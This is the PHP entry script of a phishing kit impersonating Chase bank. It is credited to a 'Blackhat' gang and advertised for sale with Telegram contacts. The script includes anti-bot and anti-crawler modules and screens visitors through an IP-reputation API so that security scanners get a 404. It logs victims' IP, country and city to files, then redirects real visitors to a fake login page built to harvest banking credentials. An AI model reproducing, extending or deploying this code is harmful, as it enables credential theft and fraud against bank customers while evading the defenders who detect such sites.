<?php
session_start();

/**
 * WE ARE FROM THE DARK 
 * STILL SERVE THE LIGHT 
 * Chase 
 * version 1.0
 * telegram = @Anonjayy,@Fizbey
 
##################################################
#$          C0d3d by ʙʟ4ᴄᴋʜ4ᴛ ɢ4ɴɢ              $#
#$   New C0d3rs in Market Best price + Qualtiy  $#
#$          Copyright 2020 Chase                $#
##################################################

**/

include'BL4CKH4T/Anti/Blackhat-IP-BL.php';  
include'BL4CKH4T/Anti/Anti-Crawler-1';
include'BL4CKH4T/Anti/Blackhat-Bot-1';
include'BL4CKH4T/Anti/Anti-bl-1';
include'BL4CKH4T/Anti/Blackhat-Bot-3';
include'BL4CKH4T/Cann_DO/BL_FUCK.php'; 
include'BL4CKH4T/Anti/Blackhat-Bot-2';


$CHASE_SESSION_SPOX = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));

 if ($redirection=="yes") {
	if (isset($_GET['id'])) {
	 $id = isset($_GET['id']) ? trim(htmlentities($_GET['id'])):'';
	  if ($id !== $redirect) {
	  	exit(header("HTTP/1.0 404 Not Found"));
	  }
	}else{
		exit(header("HTTP/1.0 404 Not Found"));
	}
  }


if ($spox_protection=="yes") {

		$ch=curl_init(); 
		curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($ch,CURLOPT_URL,"https://www.ipqualityscore.com/api/json/ip/%s/%s".$_SESSION['ip']."?full=1");
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
		curl_setopt($ch,CURLOPT_TIMEOUT,400);
		$json=curl_exec($ch);

		$ch=curl_init(); 
		curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($ch,CURLOPT_URL,"https://www.ipqualityscore.com/api/json/ip/%s/%s".$lp."");
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
		curl_setopt($ch,CURLOPT_TIMEOUT,400);
		$json=curl_exec($ch);
		curl_close($ch);

				$check = trim(strip_tags(get_string_between($json,'"bad":',',"')));
				$type = trim(strip_tags(get_string_between($json,'"type":"','"')));

			$key = substr(sha1(mt_rand()),1,25);
			
			if ($anti_bot=="yes") { if ($check == "true") {	
			$content = "#>".$_SESSION['ip']." [ ".$type." ] - [ ".$_SESSION['country']." ] - [ ".$_SESSION['countrycode']." ]\r\n";
		    $save=fopen("bots.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			header("HTTP/1.0 404 Not Found");exit();

			}
			} 

			$content = "#>".$_SESSION['ip']." [ ".$_SESSION['country']." ] - [ ".$_SESSION['city']." ] - [ ".$_SESSION['countrycode']." ]\r\n";
		    $save=fopen("visit_log.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			$_SESSION['CHASE_SPOX'] = $CHASE_SESSION_SPOX;
			exit(header("Location: login?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
		
				

	}else{
			$content = "#>".$_SESSION['ip']." [ ".$_SESSION['country']." ] - [ ".$_SESSION['city']." ] - [ ".$_SESSION['countrycode']." ]\r\n";
		    $save=fopen("visit_log.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			$_SESSION['CHASE_SPOX'] = $CHASE_SESSION_SPOX;
			exit(header("Location: login?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}

?>